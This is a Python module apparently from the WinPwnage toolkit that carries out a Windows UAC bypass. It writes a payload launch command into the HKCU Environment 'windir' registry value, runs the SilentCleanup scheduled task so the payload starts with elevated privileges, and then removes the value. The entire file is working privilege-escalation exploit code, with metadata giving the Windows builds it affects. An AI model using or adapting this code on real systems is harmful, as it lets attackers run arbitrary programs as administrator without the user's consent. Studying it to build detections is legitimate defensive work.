from winpwnage.core.prints import *
from winpwnage.core.utils import *
import time
import os

uacMethod4_info = {
	"Description": "UAC bypass using silentcleanup scheduled task",
	"Method": "Registry key (Environment) manipulation, this bypasses UAC's Always Notify.",
	"Id": "4",
	"Type": "UAC bypass",
	"Fixed In": "99999",
	"Works From": "9600",
	"Admin": False,
	"Function Name": "uacMethod4",
	"Function Payload": True,
}

def uacMethod4_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name="windir", delete_key=False):
		print_success("Successfully cleaned up")
	else:
		print_error("Unable to cleanup")
		return False

def uacMethod4(payload):
	if payloads().exe(payload):
		path = "Environment"

		if registry().modify_key(hkey="hkcu", path=path, name="windir", value="cmd.exe /c start {payload} &&".format(payload=os.path.join(payloads().exe(payload)[1])), create=True):
			print_success("Successfully created WINDIR key containing payload ({payload})".format(payload=os.path.join(payloads().exe(payload)[1])))
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("schtasks.exe", params="/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"):
				print_success("Successfully spawned process ({})".format(os.path.join(payloads().exe(payload)[1])))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[1])))
				if "error" in Constant.output:
					uacMethod4_cleanup(path)

		time.sleep(5)

		if not uacMethod4_cleanup(path):
			print_success("All done!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
